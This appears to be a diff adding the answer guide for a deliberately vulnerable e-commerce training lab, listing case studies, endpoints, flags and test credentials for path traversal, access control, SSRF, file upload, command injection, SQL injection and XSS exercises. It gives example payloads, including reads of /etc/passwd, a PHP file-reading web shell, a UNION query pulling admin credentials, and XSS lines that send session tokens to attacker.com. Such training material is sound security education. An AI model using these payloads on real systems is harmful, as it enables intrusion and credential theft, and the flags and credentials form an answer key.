@@ -1,0 +1,787 @@
+================================================================================
+        VULNERABLE ECOMMERCE LAB - CASE STUDIES AND FLAGS
+================================================================================
+
+This document contains all case study-based questions for each lab along with 
+their corresponding flags. The flags are randomly selected from predefined pools.
+
+================================================================================
+                           LAB 1: PATH TRAVERSAL
+================================================================================
+
+VULNERABILITY TYPE: Directory Traversal / Path Traversal
+SEVERITY: High
+OBJECTIVE: Access sensitive files outside the intended directories
+
+Lab 1.1 - DocuVault (Document Management System)
+================================================
+Case Study Question:
+"You are a security auditor testing the DocuVault document management system. 
+The application allows downloading invoices from the /data/docuvault/invoices/ 
+directory. Can you exploit the path traversal vulnerability to access files 
+outside this intended directory, such as configuration files or other sensitive 
+documents?"
+
+Vulnerability Location: /lab1/1/download endpoint
+Injection Parameter: 'file' parameter in query string
+Example Exploit: ../../../etc/passwd or ../../../../windows/win.ini
+Available Flags (Random Selection):
+  - FLAG{file_system_traversal_alpha}
+  - FLAG{directory_enumeration_beta}
+  - FLAG{path_manipulation_gamma}
+
+Lab 1.2 - ShopExpress (Coffee Shop E-Commerce)
+================================================
+Case Study Question:
+"The ShopExpress application displays product images from the /img/ folder. 
+However, there's a path traversal vulnerability in the image loading mechanism. 
+Can you traverse the directory structure to access protected files or 
+configuration files on the server?"
+
+Vulnerability Location: /lab1/2/image endpoint
+Injection Parameter: 'filename' in query string
+Example Exploit: ../../.env or ../../secrets.txt
+Available Flags (Random Selection):
+  - FLAG{file_system_traversal_alpha}
+  - FLAG{directory_enumeration_beta}
+  - FLAG{path_manipulation_gamma}
+
+Lab 1.3 - MediaHub (Stock Photo Marketplace)
+================================================
+Case Study Question:
+"MediaHub is a platform for buying and downloading stock photos. The download 
+mechanism in /lab1/3/download is vulnerable to path traversal. Can you exploit 
+this to download files from arbitrary locations on the server beyond the 
+intended /data/mediahub/ directory?"
+
+Vulnerability Location: /lab1/3/download endpoint
+Injection Parameter: 'file' parameter
+Example Exploit: path traversal using ../ sequences
+Available Flags (Random Selection):
+  - FLAG{file_system_traversal_alpha}
+  - FLAG{directory_enumeration_beta}
+  - FLAG{path_manipulation_gamma}
+
+================================================================================
+                        LAB 2: ACCESS CONTROL
+================================================================================
+
+VULNERABILITY TYPE: Broken Access Control / IDOR / Information Disclosure
+SEVERITY: Critical
+OBJECTIVE: Bypass access controls and gain unauthorized access to data
+
+Lab 2.1 - Resource Disclosure via Robots.txt (3 Variations)
+===========================================================
+
+Lab 2.1A - TechStore (Variation A - Tech Theme)
+================================================
+Case Study Question:
+"The TechStore e-commerce platform publishes a robots.txt file which contains 
+hidden admin panel directories. Can you discover these hidden paths and gain 
+access to the admin interface without proper authentication?"
+
+Vulnerability Location: /lab2/1/robots.txt and /lab2/1/super_secret_admin_panel_xyz
+Robots.txt File: /lab2/1/robots.txt
+Hidden Admin Panel: /lab2/1/super_secret_admin_panel_xyz
+Store Theme: Technology & Electronics (Quantum X1 Laptop, Nebula Phone, etc.)
+Available Flags (Random Selection):
+  - FLAG{resource_disclosure_delta}
+  - FLAG{metadata_exposure_epsilon}
+  - FLAG{directory_listing_zeta}
+
+Lab 2.1B - FashionHub (Variation B - Fashion Theme)
+==============================================
+Case Study Question:
+"The FashionHub retail platform also uses a robots.txt file to expose hidden 
+admin paths. Can you discover and access the admin dashboard for this fashion 
+e-commerce store?"
+
+Vulnerability Location: /lab2/1/b/robots.txt and similar admin endpoint
+Robots.txt File: /lab2/1/b/robots.txt
+Admin Endpoint: Similar pattern to variation A
+Store Theme: Fashion & Apparel (Velvet Evening Gown, Urban Street Hoodie, etc.)
+Available Flags (Random Selection):
+  - FLAG{resource_disclosure_delta}
+  - FLAG{metadata_exposure_epsilon}
+  - FLAG{directory_listing_zeta}
+
+Lab 2.1C - FoodMart (Variation C - Food/Grocery Theme)
+=====================================================
+Case Study Question:
+"The FoodMart grocery e-commerce site also has a robots.txt file with hidden 
+admin paths. Can you exploit this metadata disclosure to access the admin 
+interface without proper authorization?"
+
+Vulnerability Location: /lab2/1/c/robots.txt and similar admin endpoint
+Robots.txt File: /lab2/1/c/robots.txt
+Admin Endpoint: Similar pattern to variations A and B
+Store Theme: Food & Grocery (Organic Avocado, Artisan Sourdough, etc.)
+Available Flags (Random Selection):
+  - FLAG{resource_disclosure_delta}
+  - FLAG{metadata_exposure_epsilon}
+  - FLAG{directory_listing_zeta}
+
+Lab 2.2 - Hidden Endpoint Discovery (3 Variations)
+===================================================
+
+Lab 2.2A - GadgetShop (Variation A - Tech Gadgets Theme)
+=========================================================
+Case Study Question:
+"The GadgetShop application has hidden admin endpoints embedded in the 
+JavaScript code. These endpoints are not linked in the UI but are still 
+functional. Can you discover the hidden admin dashboard URL and access 
+it without authentication?"
+
+Vulnerability Location: /lab2/2/admin_dashboard_hidden_abc123
+Store Theme: Technology & Gadgets (Smartphone X, Tablet Pro, etc.)
+Available Flags (Random Selection):
+  - FLAG{logic_bypass_eta}
+  - FLAG{hidden_endpoint_theta}
+  - FLAG{source_code_analysis_iota}
+
+Lab 2.2B - BookStore (Variation B - Literature & Publishing Theme)
+===================================================================
+Case Study Question:
+"The BookStore e-commerce platform also contains hidden admin endpoints 
+in its source code. Can you find and access these undocumented admin paths 
+without proper authentication?"
+
+Vulnerability Location: /lab2/2/bookstore
+Hidden Admin Endpoint: Similar pattern to GadgetShop
+Store Theme: Books & Literature (The Great Gatsby, 1984, To Kill a Mockingbird, etc.)
+Available Flags (Random Selection):
+  - FLAG{logic_bypass_eta}
+  - FLAG{hidden_endpoint_theta}
+  - FLAG{source_code_analysis_iota}
+
+Lab 2.2C - GameZone (Variation C - Gaming & Entertainment Theme)
+================================================================
+Case Study Question:
+"The GameZone gaming store also has hidden admin functionality accessible 
+through undocumented endpoints. Can you discover and exploit these hidden 
+paths to gain admin access?"
+
+Vulnerability Location: /lab2/2/gamezone
+Hidden Admin Endpoint: Similar pattern to variations A and B
+Store Theme: Video Games (Elden Ring, Cyberpunk 2077, God of War, etc.)
+Available Flags (Random Selection):
+  - FLAG{logic_bypass_eta}
+  - FLAG{hidden_endpoint_theta}
+  - FLAG{source_code_analysis_iota}
+
+Lab 2.3 - Cookie Manipulation / Admin Privilege Escalation (3 Variations)
+===========================================================================
+
+Lab 2.3A - MusicStore (Variation A - Music & Audio Equipment Theme)
+=====================================================================
+Case Study Question:
+"The MusicStore application stores the admin flag in a cookie named 'Admin'. 
+The application checks if this cookie is set to 'true' to grant admin access. 
+Can you manipulate this cookie to gain administrator privileges and access 
+the admin panel?"
+
+Vulnerability Location: /lab2/3/music
+Cookie Name: 'Admin'
+Required Value: 'Admin=true'
+Store Theme: Music & Audio (Vinyl Records, Sony Headphones, Fender Guitar, etc.)
+Available Flags (Random Selection):
+  - FLAG{session_hijacking_kappa}
+  - FLAG{privilege_escalation_lambda}
+  - FLAG{token_manipulation_mu}
+
+Lab 2.3B - SportsGear (Variation B - Sports & Athletics Theme)
+===============================================================
+Case Study Question:
+"The SportsGear retail platform also uses a cookie-based admin flag system. 
+By manipulating the 'Admin' cookie to 'true', can you bypass the access 
+control and gain administrator privileges?"
+
+Vulnerability Location: /lab2/3/sports
+Cookie Name: 'Admin'
+Required Value: 'Admin=true'
+Store Theme: Sports & Fitness (Football, Tennis Racket, NBA Jersey, Running Shoes, etc.)
+Available Flags (Random Selection):
+  - FLAG{session_hijacking_kappa}
+  - FLAG{privilege_escalation_lambda}
+  - FLAG{token_manipulation_mu}
+
+Lab 2.3C - PetShop (Variation C - Pets & Animal Supplies Theme)
+===============================================================
+Case Study Question:
+"The PetShop e-commerce store also implements admin access control via 
+cookies. Can you modify the 'Admin' cookie to gain unauthorized admin 
+access to the system?"
+
+Vulnerability Location: /lab2/3/pets
+Cookie Name: 'Admin'
+Required Value: 'Admin=true'
+Store Theme: Pets & Animals (Premium Dog Food, Cat Tree Tower, Aquarium Kit, etc.)
+Available Flags (Random Selection):
+  - FLAG{session_hijacking_kappa}
+  - FLAG{privilege_escalation_lambda}
+  - FLAG{token_manipulation_mu}
+
+Lab 2.4 - Insecure Direct Object References (IDOR) - Parameter Tampering (3 Variations)
+==========================================================================================
+
+Lab 2.4A - Default Store (Variation A - General E-Commerce Theme)
+==================================================================
+Case Study Question:
+"The product management system uses a GUID (Globally Unique Identifier) in the 
+URL to identify user accounts (/lab2/4/my-account?id=GUID). By knowing or 
+guessing the admin user's GUID, can you access their account and view their 
+products without proper authorization?"
+
+Vulnerability Location: /lab2/4/my-account
+Parameter: 'id' (GUID-based)
+Attack Vector: Replace GUID with admin user's GUID
+Available Flags (Random Selection):
+  - FLAG{object_reference_nu}
+  - FLAG{identifier_tampering_xi}
+  - FLAG{access_control_omicron}
+
+Lab 2.4B - JewelryStore (Variation B - Fashion & Jewelry Theme)
+================================================================
+Case Study Question:
+"The JewelryStore uses a GUID-based account identification system with a 
+different parameter name 'user'. Can you enumerate and access the admin's 
+jewelry collection by manipulating the 'user' parameter?"
+
+Vulnerability Location: /lab2/4b/account
+Parameter: 'user' (GUID-based)
+Attack Vector: Replace GUID with admin user's GUID
+Store Theme: Jewelry & Fashion (Gold Necklace, Silver Watch, Diamond Necklace, etc.)
+Available Flags (Random Selection):
+  - FLAG{object_reference_nu}
+  - FLAG{identifier_tampering_xi}
+  - FLAG{access_control_omicron}
+
+Lab 2.4C - ElectroMart (Variation C - Electronics & Technology Theme)
+======================================================================
+Case Study Question:
+"The ElectroMart electronics store uses a similar IDOR vulnerability but with 
+the parameter name 'username' instead of 'id'. Can you access other users' 
+accounts to view their purchased electronics and admin data?"
+
+Vulnerability Location: /lab2/4c/account
+Parameter: 'username' (GUID-based)
+Attack Vector: Replace GUID with admin user's GUID
+Store Theme: Electronics & Technology (Servers, Storage, Network Equipment, etc.)
+Available Flags (Random Selection):
+  - FLAG{object_reference_nu}
+  - FLAG{identifier_tampering_xi}
+  - FLAG{access_control_omicron}
+
+Lab 2.5 - Password Disclosure via IDOR (3 Variations)
+=====================================================
+
+Lab 2.5A - Default Store (Variation A - General E-Commerce Theme)
+==================================================================
+Case Study Question:
+"The user profile page displays sensitive information including password hints 
+in HTML comments. By modifying the 'username' parameter in the profile URL, 
+can you access other users' profiles and discover their passwords?"
+
+Vulnerability Location: /lab2/5/profile
+Parameter: 'username'
+Additional Disclosure: Passwords are visible in HTML comments
+Available Flags (Random Selection):
+  - FLAG{information_leakage_pi}
+  - FLAG{credential_exposure_rho}
+  - FLAG{data_disclosure_sigma}
+
+Lab 2.5B - CloudMart (Variation B - Cloud Infrastructure / Hosting Theme)
+==========================================================================
+Case Study Question:
+"The CloudMart infrastructure-as-a-service platform stores sensitive admin 
+credentials in the HTML source. The admin account is 'root'. By accessing the 
+profile page with different usernames, can you discover the root user's 
+password?"
+
+Vulnerability Location: /lab2/5b/profile
+Parameter: 'username'
+Additional Disclosure: Passwords are visible in HTML comments
+Target Admin: 'root'
+Store Theme: Cloud Infrastructure & Services
+Available Flags (Random Selection):
+  - FLAG{information_leakage_pi}
+  - FLAG{credential_exposure_rho}
+  - FLAG{data_disclosure_sigma}
+
+Lab 2.5C - DataVault (Variation C - Data Storage & Security Theme)
+==================================================================
+Case Study Question:
+"The DataVault secure data storage platform also leaks credentials in HTML 
+comments. The system administrator account is 'owner'. Can you access the 
+owner's profile and extract the password?"
+
+Vulnerability Location: /lab2/5c/profile
+Parameter: 'username'
+Additional Disclosure: Passwords are visible in HTML comments
+Target Admin: 'owner'
+Store Theme: Data Storage & Archive Services
+Available Flags (Random Selection):
+  - FLAG{information_leakage_pi}
+  - FLAG{credential_exposure_rho}
+  - FLAG{data_disclosure_sigma}
+
+================================================================================
+                        LAB 3: AUTHENTICATION
+================================================================================
+
+VULNERABILITY TYPE: Weak Authentication / Authentication Bypass
+SEVERITY: Critical
+OBJECTIVE: Bypass authentication mechanisms
+
+Lab 3.1 - Brute Force Attack with User Enumeration
+===================================================
+Case Study Question:
+"The SecureVault login system is vulnerable to brute force attacks combined 
+with user enumeration. The error messages differ when a valid username is 
+provided but wrong password is entered ('Incorrect password.') versus an 
+invalid username ('Invalid username or password'). Can you use this 
+information leak to identify valid usernames and then perform a brute force 
+attack to crack the password using a wordlist?"
+
+Vulnerability Location: /lab3/1/login
+Target Credentials: Random from /data/wordlists/usernames.txt and passwords.txt
+Vulnerability: User enumeration + Brute force
+Variations:
+  - /lab3/1/2 (Luxury variant)
+  - /lab3/1/3 (Corporate variant)
+Available Flags (Random Selection):
+  - FLAG{weak_validation_tau}
+  - FLAG{enum_prediction_upsilon}
+  - FLAG{authentication_bypass_phi}
+
+Lab 3.2 - Two-Factor Authentication (2FA) Bypass
+=================================================
+Case Study Question:
+"The SecureShop application implements a 2FA mechanism where after a successful 
+login with username and password, the user must provide a 4-digit verification 
+code sent via email. However, there's a logic flaw: the 2FA verification check 
+can be bypassed by directly accessing the account page. Can you manipulate the 
+session to skip the 2FA verification step and gain access to the 'carlos' 
+account?"
+
+Vulnerability Location: /lab3/2/my-account
+Exploit Method: Direct navigation without completing 2FA
+Target Account: 'carlos' or 'bob' (variant)
+Session Variables: lab3_2_verified (can be bypassed)
+Variations:
+  - /lab3/2b (BankSecure - Target: 'bob')
+  - /lab3/2c (CloudDrive - Target: 'admin')
+Available Flags (Random Selection):
+  - FLAG{mfa_weakness_chi}
+  - FLAG{otp_bypass_psi}
+  - FLAG{verification_flaw_omega}
+
+Available Credentials for Testing:
+  Lab 3.2a: wiener:peter, carlos:montoya
+  Lab 3.2b: alice:alice123, bob:bob456
+  Lab 3.2c: user1:pass1, admin:admin2024
+
+================================================================================
+                    LAB 4: SERVER-SIDE REQUEST FORGERY (SSRF)
+================================================================================
+
+VULNERABILITY TYPE: SSRF / Insecure Requests to Internal Services
+SEVERITY: High
+OBJECTIVE: Make the server perform HTTP requests to internal/restricted endpoints
+
+Lab 4.1 - SSRF via Stock Check API
+===================================
+Case Study Question:
+"The e-commerce platform has a stock checking feature that accepts a 
+'stockApi' parameter which is used to query external APIs. However, the 
+parameter is not validated, allowing an attacker to specify arbitrary URLs. 
+Can you exploit this to make the server request internal endpoints like 
+http://localhost:5000/admin which are normally blocked from external access? 
+This would give you access to the internal admin panel."
+
+Vulnerability Location: /lab4/1/stock (POST request)
+Parameter: 'stockApi'
+Internal Endpoint: http://localhost:5000/admin
+Protected Endpoint: /admin/delete (requires internal access)
+Target Query Parameter: /admin/delete?username=carlos (to delete a user)
+Variations:
+  - /lab4/1/b (Cloud Infrastructure Marketplace)
+  - /lab4/1/c (Logistics & Transportation)
+Available Flags (Random Selection):
+  - FLAG{internal_access_alpha2}
+  - FLAG{service_probing_beta2}
+  - FLAG{network_recon_gamma2}
+
+================================================================================
+                      LAB 5: FILE UPLOAD VULNERABILITIES
+================================================================================
+
+VULNERABILITY TYPE: Unrestricted File Upload / RCE via Upload
+SEVERITY: Critical
+OBJECTIVE: Upload malicious files and achieve code execution
+
+Lab 5.1 - Remote Code Execution via Web Shell Upload
+======================================================
+Case Study Question:
+"The user profile system allows uploading avatar images with no file type 
+validation. An attacker can upload a PHP file (e.g., exploit.php) containing 
+PHP code instead of an image. When the server serves this file, the PHP code 
+is executed. Can you upload a PHP web shell and execute arbitrary commands on 
+the server?"
+
+Vulnerability Location: /lab5/1/upload
+File Serving: /files/avatars/{uid}/{filename}
+Exploit Payload: PHP file with code that reads files
+Example Payload: <?php echo file_get_contents('/home/carlos/secret'); ?>
+Login Credentials: wiener:peter
+Variations:
+  - /lab5/1/b (PixelArt - NFT/Crypto theme)
+  - /lab5/1/c (HireMinds - Job Portal theme)
+Available Flags (Random Selection):
+  - FLAG{upload_validation_delta2}
+  - FLAG{file_execution_epsilon2}
+  - FLAG{storage_bypass_zeta2}
+
+Lab 5.2 - Content-Type Bypass (MIME Type Validation)
+======================================================
+Case Study Question:
+"The application validates file uploads by checking the Content-Type HTTP 
+header. It only accepts 'image/jpeg' and 'image/png'. However, this validation 
+can be bypassed because the Content-Type header can be spoofed by an attacker. 
+An attacker can upload a PHP file but set the Content-Type to 'image/jpeg', 
+and the server will accept it. When the file is served, it will be executed 
+as PHP. Can you exploit this Content-Type bypass to gain code execution?"
+
+Vulnerability Location: /lab5/2/upload
+Content-Type Bypass: Change file extension to PHP but keep Content-Type as image/jpeg
+Login Credentials: wiener:peter
+Variations:
+  - /lab5/2/b (Global Logistics)
+  - /lab5/2/c (SecureBank)
+Available Flags (Random Selection):
+  - FLAG{content_verification_eta2}
+  - FLAG{type_confusion_theta2}
+  - FLAG{filter_evasion_iota2}
+
+================================================================================
+                  LAB 6: OS COMMAND INJECTION
+================================================================================
+
+VULNERABILITY TYPE: OS Command Injection / Shell Injection
+SEVERITY: Critical
+OBJECTIVE: Execute arbitrary operating system commands
+
+Lab 6.1 - Command Injection via Stock Check
+=============================================
+Case Study Question:
+"The stock checking feature uses the server's operating system to ping an 
+address and return the result. The 'storeId' parameter is directly 
+concatenated into a system command without sanitization. Can you inject 
+additional OS commands using ; or && or | operators to execute arbitrary 
+commands on the server?"
+
+Vulnerability Location: /lab6/1/check-stock (POST request)
+Parameter: 'locationId' or 'branchId'
+Command Template: ping -c 1 {parameter}
+Injection Method: Use ; or && or | to chain commands
+Example: 1|whoami or 1 && cat /etc/passwd
+Variations:
+  - /lab6/1/b (AutoParts Pro - Parameter: 'locationId')
+  - /lab6/1/c (PharmaCare - Parameter: 'branchId')
+Available Flags (Random Selection):
+  - FLAG{command_execution_kappa2}
+  - FLAG{system_control_lambda2}
+  - FLAG{process_injection_mu2}
+
+================================================================================
+                      LAB 7: SQL INJECTION
+================================================================================
+
+VULNERABILITY TYPE: SQL Injection / Database Manipulation
+SEVERITY: Critical
+OBJECTIVE: Extract, modify, or delete database data
+
+Lab 7.1A - WHERE Clause SQL Injection (GiftShop)
+=================================================
+Case Study Question:
+"The GiftShop product search uses a 'category' parameter in a SQL WHERE 
+clause. The query is constructed as: SELECT * FROM products WHERE category 
+= 'Gifts' AND released = 1. An attacker can inject SQL syntax to bypass the 
+'released = 1' check and view unreleased products. Can you craft a SQL 
+injection payload to bypass the access control and view all products, 
+including unreleased ones?"
+
+Vulnerability Location: /lab7/1
+Parameter: 'category' (GET request)
+Query Template: SELECT * FROM lab7_products WHERE category = '{category}' AND released = 1
+Injection Payload: Gifts' OR 1=1--
+Comment Symbol: -- (removes remaining query)
+Available Flags (Random Selection):
+  - FLAG{query_manipulation_nu2}
+  - FLAG{database_access_xi2}
+  - FLAG{record_extraction_omicron2}
+
+Lab 7.1B - Authentication Bypass via SQL Injection (Staff Portal)
+=================================================================
+Case Study Question:
+"The Staff Portal login uses a vulnerable SQL query to authenticate users: 
+SELECT * FROM users WHERE username = '{username}' AND password = '{password}'. 
+An attacker can inject SQL syntax in the username field to bypass password 
+verification and log in as an administrator. Can you craft a payload to 
+authenticate as 'admin_office' without knowing the password?"
+
+Vulnerability Location: /lab7/2/login
+Parameter: Just 'username' (username field in login form)
+Query Template: SELECT * FROM lab7_office_users WHERE username = '{username}' AND password = '{password}'
+Injection Payload: admin_office' -- (comment out password check)
+Available Flags (Random Selection):
+  - FLAG{query_manipulation_nu2}
+  - FLAG{database_access_xi2}
+  - FLAG{record_extraction_omicron2}
+
+Lab 7.1C - UNION-Based SQL Injection (PetShop)
+================================================
+Case Study Question:
+"The PetShop portal queries pets from a database and displays: name, breed, 
+price, image_url. However, there's another sensitive table 'lab7_admin_creds' 
+containing admin usernames and passwords. Using UNION-based SQL injection, 
+can you extract the administrator credentials from the hidden table?"
+
+Vulnerability Location: /lab7/1/c
+Parameter: 'category' (GET request)
+Original Columns: 4 (name, breed, price, image_url)
+Hidden Table: lab7_admin_creds
+Hidden Columns: username, password
+Injection Payload: Dogs' UNION SELECT username, password, 1, 'https://placeholder.com' FROM lab7_admin_creds--
+Available Flags (Random Selection):
+  - FLAG{query_manipulation_nu2}
+  - FLAG{database_access_xi2}
+  - FLAG{record_extraction_omicron2}
+
+Lab 7.1D - Integer-Based SQL Injection (HR Portal)
+====================================================
+Case Study Question:
+"The HR Portal searches for employees by ID number. The SQL query is: 
+SELECT * FROM employees WHERE id = {emp_id} AND is_public = 1. Notice no 
+quotes around the ID! This is integer-based SQL injection. The CEO's profile 
+is marked as is_public = 0, so it's normally hidden. Can you use integer-based 
+SQL injection to bypass the is_public check and access the CEO's secret data?"
+
+Vulnerability Location: /lab7/1/d
+Parameter: 'id' (GET request)
+Query Template: SELECT * FROM lab7_employees WHERE id = {id} AND is_public = 1
+Injection Payload: 1 OR 1=1-- (no quotes needed for integer injection)
+Target Row: Employee marked as is_public = 0 (CEO information)
+Available Flags (Random Selection):
+  - FLAG{query_manipulation_nu2}
+  - FLAG{database_access_xi2}
+  - FLAG{record_extraction_omicron2}
+
+================================================================================
+                  LAB 8: CROSS-SITE SCRIPTING (XSS)
+================================================================================
+
+VULNERABILITY TYPE: Reflected XSS / Stored XSS
+SEVERITY: High
+OBJECTIVE: Inject and execute JavaScript code in the browser
+
+Lab 8.1 - Reflected XSS (3 Variations)
+====================================
+
+Lab 8.1A - ContactForm (Variation A - HTTP Header Reflection XSS)
+================================================================
+Case Study Question:
+"The ContactForm web application allows users to submit contact requests and 
+include their website URL. However, the application reflects the 'Referer' HTTP 
+header (which contains the referring page URL) in the email notification without 
+proper sanitization. An attacker can craft a malicious Referer header containing 
+JavaScript code. When the email is viewed in an HTML-capable email client, the 
+script executes. Can you craft a Referer header containing XSS payload that 
+executes when the confirmation page is loaded?"
+
+Vulnerability Location: /lab8/1/contact-submit
+Parameter: HTTP Header 'Referer' (reflected in response)
+Vulnerable Field: The 'Referer' header is reflected in HTML email/confirmation page
+Injection Point: Referer HTTP header containing JavaScript
+Injection Context: HTML attribute context (quoted attribute)
+Example Payload: https://attacker.com/" onload="alert('Header XSS')
+Advanced Payload: https://normal.com/page.html"><script src='http://attacker.com/steal.js'></script>
+Detection: Analyzing HTTP headers and response reflection
+Bypass Techniques: Using event handlers in attribute context, encoding
+Available Flags (Random Selection):
+  - FLAG{script_injection_pi2}
+  - FLAG{context_escape_rho2}
+  - FLAG{dom_manipulation_sigma2}
+
+Lab 8.1B - APIGateway (Variation B - JSON Parameter XSS)
+=========================================================
+Case Study Question:
+"The APIGateway integration service accepts JSON requests with a 'callback' 
+parameter used for JSONP (JSON with Padding) responses. The application 
+reflects the callback parameter name directly in the JavaScript response 
+without validation. An attacker can inject malicious function names or 
+JavaScript code into the callback parameter. When the browser executes the 
+JSONP response, the injected code runs. Can you craft a JSONP callback 
+payload that executes arbitrary JavaScript and exfiltrates user data?"
+
+Vulnerability Location: /lab8/1b/api/data
+Parameter: 'callback' (JSON/JSONP request)
+Vulnerable Field: Callback function name reflected in JSONP response
+Injection Point: JSONP callback parameter in API request
+Injection Context: JavaScript code context (function name)
+Example Payload: alert('JSONP XSS');function _
+Advanced Payload: fetch('http://attacker.com/steal?data='+btoa(sessionStorage.getItem('token')));var x=1;function _
+Detection: Analyzing JSONP responses and function naming
+Bypass Techniques: Function name injection, statement chaining with semicolons
+Available Flags (Random Selection):
+  - FLAG{script_injection_pi2}
+  - FLAG{context_escape_rho2}
+  - FLAG{dom_manipulation_sigma2}
+
+Lab 8.1C - VideoStream (Variation C - DOM Attribute Data Reflection XSS)
+=========================================================================
+Case Study Question:
+"The VideoStream platform allows users to customize video player settings via 
+URL parameters. The 'title' parameter is reflected into a data attribute of an 
+HTML element (data-tooltip='...'). The JavaScript code then reads this 
+attribute and inserts it into the DOM using innerHTML without sanitization. 
+An attacker can break out of the attribute context and inject scripts. When 
+the page is loaded, malicious JavaScript in the data attribute is inserted 
+into the document and executed. Can you craft a payload that exploits this 
+DOM-based reflection to execute code and steal login session information?"
+
+Vulnerability Location: /lab8/1c/player
+Parameter: 'title' (GET request)
+Vulnerable Field: URL parameter reflected in HTML data attribute
+Injection Point: data-tooltip attribute in video player element
+Injection Context: HTML attribute context with subsequent DOM innerHTML insertion
+Reflection Method: Parameter → HTML attribute → DOM innerHTML insertion
+Example Payload: Video'></div><img src=x onerror='alert("DOM XSS")'><div class='x
+Advanced Payload: "><iframe src="javascript:alert(document.cookie)"></iframe><span class="x
+Detection: Analyzing data attributes and DOM manipulation code in JavaScript
+Bypass Techniques: Attribute breaking with quotes, iframe injection, nested event handlers
+Available Flags (Random Selection):
+  - FLAG{script_injection_pi2}
+  - FLAG{context_escape_rho2}
+  - FLAG{dom_manipulation_sigma2}
+
+Lab 8.2 - Stored XSS (Persistent)
+==================================
+Case Study Question:
+"The user profile page stores user-provided information in the database. 
+Fields like 'full_name', 'email', 'address', and 'bio' are not sanitized 
+before storage or display. If an attacker injects JavaScript code into these 
+fields, it will be stored in the database and executed every time the profile 
+is viewed. Can you inject JavaScript into a profile field and have it execute 
+when the profile is displayed?"
+
+Vulnerability Location: /lab8/2/update
+Vulnerable Fields: 'full_name', 'email', 'address', 'bio'
+Injection Point: Any of the above fields in the profile update form
+Example Payload: <script>alert('Stored XSS')</script>
+Stored Location: Database (session in this case)
+Execution: JavaScript runs every time /lab8/2/dashboard is viewed
+Login Credentials: test:test
+Available Flags (Random Selection):
+  - FLAG{script_injection_pi2}
+  - FLAG{context_escape_rho2}
+  - FLAG{dom_manipulation_sigma2}
+
+================================================================================
+                         SUMMARY BY VULNERABILITY
+================================================================================
+
+PATH TRAVERSAL (Lab 1):
+  - Flags: file_system_traversal_alpha, directory_enumeration_beta, path_manipulation_gamma
+
+ACCESS CONTROL (Lab 2):
+  - Lab 2.1 (Robots.txt): resource_disclosure_delta, metadata_exposure_epsilon, directory_listing_zeta
+  - Lab 2.2 (Hidden Links): logic_bypass_eta, hidden_endpoint_theta, source_code_analysis_iota
+  - Lab 2.3 (Cookie): session_hijacking_kappa, privilege_escalation_lambda, token_manipulation_mu
+  - Lab 2.4 (IDOR): object_reference_nu, identifier_tampering_xi, access_control_omicron
+  - Lab 2.5 (Password Disclosure): information_leakage_pi, credential_exposure_rho, data_disclosure_sigma
+
+AUTHENTICATION (Lab 3):
+  - Lab 3.1 (Brute Force): weak_validation_tau, enum_prediction_upsilon, authentication_bypass_phi
+  - Lab 3.2 (2FA Bypass): mfa_weakness_chi, otp_bypass_psi, verification_flaw_omega
+
+SSRF (Lab 4):
+  - internal_access_alpha2, service_probing_beta2, network_recon_gamma2
+
+FILE UPLOAD (Lab 5):
+  - Lab 5.1 (RCE): upload_validation_delta2, file_execution_epsilon2, storage_bypass_zeta2
+  - Lab 5.2 (Content-Type): content_verification_eta2, type_confusion_theta2, filter_evasion_iota2
+
+COMMAND INJECTION (Lab 6):
+  - command_execution_kappa2, system_control_lambda2, process_injection_mu2
+
+SQL INJECTION (Lab 7):
+  - query_manipulation_nu2, database_access_xi2, record_extraction_omicron2
+
+XSS (Lab 8):
+  - script_injection_pi2, context_escape_rho2, dom_manipulation_sigma2
+
+================================================================================
+                          KEY TESTING TIPS
+================================================================================
+
+1. PATH TRAVERSAL (Lab 1):
+   - Try: ../ sequences, ..\ (Windows), ../../, absolute paths
+   - Test different encoding: URL encoding, Unicode, case variations
+
+2. ACCESS CONTROL (Lab 2):
+   - Check robots.txt for hidden paths
+   - Inspect HTML/JavaScript source for hidden endpoints
+   - Modify cookies in browser developer tools
+   - Try accessing admin endpoints directly
+   - Enumerate user IDs/GUIDs
+
+3. AUTHENTICATION (Lab 3):
+   - Capture login requests in Burp Suite
+   - Use Intruder for brute force with wordlists
+   - Look for user enumeration differences in responses
+   - Analyze session cookies and 2FA implementation
+
+4. SSRF (Lab 4):
+   - Try http://localhost/admin, http://127.0.0.1/admin
+   - Exploit internal request functionality
+   - Use Burp Collaborator or local tunneling
+
+5. FILE UPLOAD (Lab 5):
+   - Bypass file type checks with .php, .phtml, .php5 extensions
+   - Modify Content-Type headers
+   - Upload web shells and access them via /files/avatars/
+
+6. COMMAND INJECTION (Lab 6):
+   - Use command separators: ; && | || `
+   - Test: whoami, id, cat /etc/passwd, ls, dir
+   - Chain commands to verify execution
+
+7. SQL INJECTION (Lab 7):
+   - Single quote (') to break out of string context
+   - Use -- or # for SQL comments
+   - Try: OR 1=1, UNION SELECT, ORDER BY for column enumeration
+   - Extract data using UNION attacks
+
+8. XSS (Lab 8):
+   - Test: <script>alert('XSS')</script>, <img src=x onerror=alert()>
+   - Try different event handlers: onerror, onclick, onload
+   - Check reflected and stored vulnerabilities separately
+
+================================================================================
+                      TOOLS RECOMMENDED FOR TESTING
+================================================================================
+
+- Burp Suite Community Edition (Free) - Proxy and exploitation tools
+- OWASP ZAP - Free security scanning tool
+- Intruder - Brute force attacks (Burp)
+- Repeater - Manual request modification (Burp)
+- Decoder - URL/Base64 encoding (Burp)
+- Browser Developer Tools - Cookie manipulation, DOM inspection
+- curl/wget - Command-line HTTP requests
+- SQLmap - Automated SQL injection testing
+- payloadsallthethings - Collection of exploit payloads
+
+================================================================================
+                             END OF DOCUMENT
+================================================================================
